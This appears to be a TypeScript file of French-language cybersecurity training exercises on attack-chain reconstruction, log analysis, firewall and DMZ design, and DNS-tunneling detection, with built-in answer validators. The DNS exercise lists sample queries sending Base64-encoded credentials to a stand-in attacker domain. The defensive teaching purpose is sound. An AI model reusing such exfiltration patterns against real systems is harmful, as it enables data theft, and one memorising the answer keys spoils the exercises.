  // MODULE 3C — AVANCÉ : Attaque multi-couches simulée
  {
    id: 'net-multi-layer-attack',
    title: 'Réseau : Attaque multi-couches',
    description: 'Reconstitue une chaîne d\'attaque complète traversant toutes les couches OSI.',
    category: 'network',
    difficulty: 'avancé',
    type: 'project',
    requiredSkills: ['net-tcp-handshake'],
    xpReward: { technical: 50, analytical: 50, detection: 30 },
    content: {
      type: 'project',
      scenario: 'L\'attaquant a exploité un VLAN mal configuré, effectué un ARP spoof, redirigé le DNS, puis exfiltré des données via le port 8443. Reconstitue la chaîne d\'attaque.',
      objectives: [
        'Associer chaque étape à une couche OSI',
        'Reconstruire la kill chain complète',
        'Proposer une remédiation par couche',
      ],
      externalInstructions: [
        'Étapes observées :',
        '1. L\'attaquant accède au VLAN Finance depuis le VLAN Guest (isolation cassée)',
        '2. Il envoie des paquets ARP falsifiés pour se faire passer pour la gateway',
        '3. Il redirige les requêtes DNS vers son propre serveur',
        '4. Il exfiltre les données via HTTPS sur le port 8443',
        '',
        'Pour chaque étape, indique la couche OSI (1-7). Format : "1:X, 2:X, 3:X, 4:X"',
      ],
      validationHint: 'VLAN=Couche 2, ARP=Couche 2, DNS=Couche 7, HTTPS/port=Couche 4-7',
      validator: (s: string) => {
        const lower = s.replace(/\s/g, '');
        const has2 = lower.includes('1:2') || lower.includes('étape1:2');
        const hasArp2 = lower.includes('2:2');
        const hasDns7 = lower.includes('3:7');
        const hasExfil = lower.includes('4:4') || lower.includes('4:7');
        if (has2 && hasArp2 && (hasDns7 || hasExfil)) {
          return { passed: true, feedback: 'Excellent ! VLAN (L2) → ARP spoof (L2) → DNS hijack (L7) → Exfiltration (L4/L7). Remédiation : segmentation VLAN stricte, DHCP snooping, DNSSEC, et DPI sur les ports non-standard.' };
        }
        return { passed: false, feedback: 'Relis chaque étape : VLAN et ARP sont couche 2, DNS est couche 7, le port d\'exfiltration concerne la couche 4 ou 7.' };
      },
    },
  },

  // ═══════════════════════════════════════════════
  // CATÉGORIE 4 — LECTURE DE LOGS
  // ═══════════════════════════════════════════════

  // MODULE 4A — BASIQUE : Lire un log Apache
  {
    id: 'logs-apache-basics',
    title: 'Logs : Lire un log Apache',
    description: 'Apprends la structure d\'un log Apache et détecte une tentative de brute force.',
    category: 'logs',
    difficulty: 'débutant',
    type: 'project',
    requiredSkills: [],
    xpReward: { analytical: 30, detection: 20 },
    content: {
      type: 'project',
      scenario: 'Le WAF a capturé des requêtes suspectes sur le portail RH. Analyse le log et identifie l\'attaquant.',
      objectives: [
        'Comprendre la structure d\'un log Apache (IP, timestamp, requête, code HTTP)',
        'Identifier les codes d\'erreur 401 (Unauthorized)',
        'Repérer l\'IP qui tente une attaque par brute force',
      ],
      externalInstructions: [
        'Extrait du log :',
        '192.168.1.10 - - [15/Mar] "GET /dashboard" 200',
        '45.33.2.1 - - [15/Mar] "POST /login" 401',
        '45.33.2.1 - - [15/Mar] "POST /login" 401',
        '45.33.2.1 - - [15/Mar] "POST /login" 401',
        '45.33.2.1 - - [15/Mar] "POST /login" 200',
        '10.0.0.5 - - [15/Mar] "GET /api/users" 200',
        '',
        'Quelle IP a réussi à se connecter après plusieurs échecs ? (Tape l\'IP)',
      ],
      validationHint: 'Cherche l\'IP avec plusieurs 401 suivis d\'un 200 sur /login.',
      validator: (s: string) => {
        if (s.trim().includes('45.33.2.1')) {
          return { passed: true, feedback: 'Correct ! L\'IP 45.33.2.1 a fait 3 tentatives échouées (401) puis a réussi (200). C\'est un brute force réussi — il faut immédiatement réinitialiser le mot de passe et bloquer cette IP.' };
        }
        return { passed: false, feedback: 'Cherche l\'IP qui a plusieurs codes 401 suivis d\'un 200 sur la page /login.' };
      },
    },
  },

  // MODULE 4B — INTERMÉDIAIRE : Logs SSH
  {
    id: 'logs-ssh-analysis',
    title: 'Logs : Analyse auth.log SSH',
    description: 'Analyse le fichier /var/log/auth.log pour détecter une attaque brute force SSH.',
    category: 'logs',
    difficulty: 'intermédiaire',
    type: 'project',
    requiredSkills: ['logs-apache-basics'],
    xpReward: { analytical: 40, detection: 30 },
    content: {
      type: 'project',
      scenario: 'Le serveur de développement signale des connexions SSH inhabituelles. Analyse les logs d\'authentification.',
      objectives: [
        'Lire le format de /var/log/auth.log',
        'Identifier les tentatives de connexion échouées',
        'Déterminer l\'utilisateur ciblé et l\'IP source',
      ],
      externalInstructions: [
        'Extrait de /var/log/auth.log :',
        'Mar 15 02:14:01 srv sshd[4521]: Failed password for root from 103.45.67.89 port 52341',
        'Mar 15 02:14:03 srv sshd[4522]: Failed password for root from 103.45.67.89 port 52342',
        'Mar 15 02:14:05 srv sshd[4523]: Failed password for root from 103.45.67.89 port 52343',
        'Mar 15 02:14:07 srv sshd[4524]: Failed password for admin from 103.45.67.89 port 52344',
        'Mar 15 02:14:09 srv sshd[4525]: Accepted password for admin from 103.45.67.89 port 52345',
        '',
        'Réponds au format : IP_ATTAQUANT | UTILISATEUR_COMPROMIS | HEURE',
      ],
      validationHint: 'Cherche la ligne "Accepted password" — c\'est la connexion réussie.',
      validator: (s: string) => {
        const lower = s.toLowerCase();
        const hasIP = lower.includes('103.45.67.89');
        const hasUser = lower.includes('admin');
        const hasTime = lower.includes('02:14');
        if (hasIP && hasUser) {
          return { passed: true, feedback: 'Parfait ! L\'attaquant 103.45.67.89 a compromis le compte "admin" à 02:14:09 après avoir échoué sur "root". Actions : désactiver le mot de passe, forcer l\'authentification par clé SSH, bannir l\'IP via fail2ban.' };
        }
        return { passed: false, feedback: 'Cherche la ligne avec "Accepted password" pour trouver l\'utilisateur compromis et l\'IP.' };
      },
    },
  },

  // MODULE 4C — AVANCÉ : Corrélation multi-logs
  {
    id: 'logs-correlation',
    title: 'Logs : Corrélation multi-sources',
    description: 'Reconstitue une attaque complète en corrélant des logs firewall, DNS et système.',
    category: 'logs',
    difficulty: 'avancé',
    type: 'project',
    requiredSkills: ['logs-ssh-analysis'],
    xpReward: { analytical: 60, detection: 50, reflexion: 30 },
    content: {
      type: 'project',
      scenario: 'Trois sources de logs différentes montrent des anomalies au même moment. Reconstitue la chronologie de l\'attaque.',
      objectives: [
        'Corréler des événements provenant de sources différentes',
        'Reconstituer la timeline de l\'attaque',
        'Identifier la technique utilisée',
      ],
      externalInstructions: [
        '📋 LOG FIREWALL (14:30) :',
        'ALLOW TCP 10.0.0.50 → 198.51.100.42:443 (HTTPS)',
        '',
        '📋 LOG DNS (14:29) :',
        'Query: update.kronos-internal.com → 198.51.100.42 (UNEXPECTED - should resolve to 10.0.0.10)',
        '',
        '📋 LOG SYSTÈME (14:28) :',
        'hosts file modified: 10.0.0.50 added entry "198.51.100.42 update.kronos-internal.com"',
        '',
        'Quelle technique a été utilisée ? (DNS hijack / hosts poisoning / ARP spoof)',
        'Et quelle machine est compromise ? (IP)',
      ],
      validationHint: 'Regarde quel fichier a été modifié en premier (14:28) et sur quelle machine.',
      validator: (s: string) => {
        const lower = s.toLowerCase();
        const hasTechnique = lower.includes('hosts') || lower.includes('poisoning');
        const hasIP = lower.includes('10.0.0.50');
        if (hasTechnique && hasIP) {
          return { passed: true, feedback: 'Excellent ! L\'attaquant a modifié le fichier hosts de 10.0.0.50 (14:28), redirigeant update.kronos-internal.com vers son C2 (14:29), puis la machine a contacté le C2 en HTTPS (14:30). C\'est du hosts file poisoning — plus simple qu\'un DNS spoof mais tout aussi dangereux.' };
        }
        return { passed: false, feedback: 'Lis les logs chronologiquement (14:28 → 14:29 → 14:30). Le premier événement révèle la technique utilisée.' };
      },
    },
  },

  // ═══════════════════════════════════════════════
  // CATÉGORIE 5 — RÉSEAU (PROJETS COMPLETS)
  // ═══════════════════════════════════════════════

  // MODULE 5A — BASIQUE : Configurer un mini réseau
  {
    id: 'net-config-basics',
    title: 'Réseau : Configuration IP',
    description: 'Configure deux machines pour qu\'elles puissent communiquer sur le même sous-réseau.',
    category: 'network',
    difficulty: 'débutant',
    type: 'project',
    requiredSkills: [],
    xpReward: { technical: 25, analytical: 15 },
    content: {
      type: 'project',
      scenario: 'Deux postes du SOC ne peuvent pas communiquer. Tu dois vérifier leur configuration réseau et identifier l\'erreur.',
      objectives: [
        'Comprendre IP, masque et gateway',
        'Identifier pourquoi deux machines ne communiquent pas',
      ],
      externalInstructions: [
        'Machine A : IP=192.168.1.10, Masque=255.255.255.0, Gateway=192.168.1.1',
        'Machine B : IP=192.168.2.20, Masque=255.255.255.0, Gateway=192.168.2.1',
        '',
        'Les deux machines sont branchées sur le même switch.',
        'Pourquoi ne peuvent-elles pas communiquer ? (Tape ta réponse)',
        'Et quelle IP donnerais-tu à la Machine B pour corriger ? (Format: réponse + IP)',
      ],
      validationHint: 'Compare les sous-réseaux des deux machines.',
      validator: (s: string) => {
        const lower = s.toLowerCase();
        const hasReason = lower.includes('sous-réseau') || lower.includes('subnet') || lower.includes('réseau différent') || lower.includes('192.168.1');
        if (hasReason) {
          return { passed: true, feedback: 'Correct ! Machine A est sur 192.168.1.0/24 et Machine B sur 192.168.2.0/24. Sur un même switch sans routeur, elles doivent être sur le même sous-réseau. Machine B devrait avoir une IP en 192.168.1.X.' };
        }
        return { passed: false, feedback: 'Compare les réseaux : 192.168.1.X vs 192.168.2.X. Sont-ils sur le même sous-réseau ?' };
      },
    },
  },

  // MODULE 5B — INTERMÉDIAIRE : Simuler DMZ
  {
    id: 'net-dmz-design',
    title: 'Réseau : Architecture DMZ',
    description: 'Conçois une architecture DMZ pour exposer un serveur web sans compromettre le LAN.',
    category: 'network',
    difficulty: 'intermédiaire',
    type: 'project',
    requiredSkills: ['net-config-basics'],
    xpReward: { technical: 40, analytical: 30 },
    content: {
      type: 'project',
      scenario: 'Kronos veut exposer un portail client sur Internet sans que les attaquants puissent atteindre le réseau interne. Conçois les règles firewall.',
      objectives: [
        'Séparer le réseau en 3 zones : Internet, DMZ, LAN',
        'Définir les règles de filtrage',
        'Comprendre le concept de NAT',
      ],
      externalInstructions: [
        'Zones :',
        '- Internet (externe)',
        '- DMZ : 172.16.0.0/24 (serveur web : 172.16.0.10)',
        '- LAN : 10.0.0.0/24 (serveurs internes)',
        '',
        'Construis un JSON avec 3 règles firewall. Chaque règle a : "from", "to", "port", "action"',
        'Règle 1 : Internet peut accéder au port 443 de la DMZ',
        'Règle 2 : DMZ peut accéder au port 3306 du LAN (base de données)',
        'Règle 3 : Internet ne peut PAS accéder au LAN',
      ],
      validationHint: 'Le JSON doit être un tableau de 3 objets avec les bonnes actions (allow/deny).',
      validator: (s: string) => {
        try {
          const rules = JSON.parse(s);
          if (Array.isArray(rules) && rules.length >= 3) {
            const hasAllow443 = rules.some((r: any) => r.port === 443 && r.action === 'allow');
            const hasAllow3306 = rules.some((r: any) => r.port === 3306 && r.action === 'allow');
            const hasDeny = rules.some((r: any) => r.action === 'deny');
            if (hasAllow443 && hasAllow3306 && hasDeny) {
              return { passed: true, feedback: 'Parfait ! Ta DMZ est bien conçue : le web est accessible, la DB est joignable depuis la DMZ seulement, et le LAN est isolé d\'Internet. C\'est l\'architecture standard de sécurité périmétrique.' };
            }
          }
          return { passed: false, feedback: 'Vérifie : 3 règles minimum, port 443 en allow, port 3306 en allow depuis DMZ, et un deny pour Internet→LAN.' };
        } catch {
          return { passed: false, feedback: 'JSON invalide. Assure-toi de fournir un tableau JSON valide : [{...}, {...}, {...}]' };
        }
      },
    },
  },

  // MODULE 5C — AVANCÉ : Détection d'exfiltration lente (DNS tunneling)
  {
    id: 'net-dns-tunneling',
    title: 'Réseau : DNS Tunneling',
    description: 'L\'attaquant exfiltre des données par petites quantités via des requêtes DNS. Détecte le tunnel.',
    category: 'network',
    difficulty: 'avancé',
    type: 'project',
    requiredSkills: ['net-dmz-design'],
    xpReward: { technical: 60, detection: 50, analytical: 40 },
    content: {
      type: 'project',
      scenario: 'Le volume de requêtes DNS a augmenté de 3000% sur le serveur interne 10.0.0.50. Les requêtes semblent anormalement longues. C\'est peut-être du DNS tunneling.',
      objectives: [
        'Comprendre le DNS tunneling (données encodées dans les sous-domaines)',
        'Identifier les requêtes DNS suspectes',
        'Calculer le volume de données exfiltrées',
      ],
      externalInstructions: [
        'Requêtes DNS capturées (dernière minute) :',
        'dXNlcm5hbWU9YWRtaW4=.data.evil-dns.com',
        'cGFzc3dvcmQ9UzNjcjN0.data.evil-dns.com',
        'Y3JlZGl0X2NhcmQ9NDU1Ng==.data.evil-dns.com',
        '',
        'Les sous-domaines semblent encodés en Base64.',
        'Décode le premier sous-domaine (dXNlcm5hbWU9YWRtaW4=) et tape le résultat.',
      ],
      validationHint: 'Décode la chaîne Base64 du premier sous-domaine.',
      validator: (s: string) => {
        const lower = s.toLowerCase().trim();
        if (lower.includes('username=admin')) {
          return { passed: true, feedback: 'Exact ! "dXNlcm5hbWU9YWRtaW4=" décode en "username=admin". L\'attaquant exfiltre des credentials via DNS ! Chaque requête DNS transporte un fragment de données volées encodé dans le sous-domaine. Contre-mesure : limiter la longueur des requêtes DNS, bloquer les domaines inconnus, et déployer un DNS sinkhole.' };
        }
        return { passed: false, feedback: 'Décode la chaîne Base64 "dXNlcm5hbWU9YWRtaW4=" avec un outil comme CyberChef ou echo "..." | base64 -d' };
      },
    },
  },
];
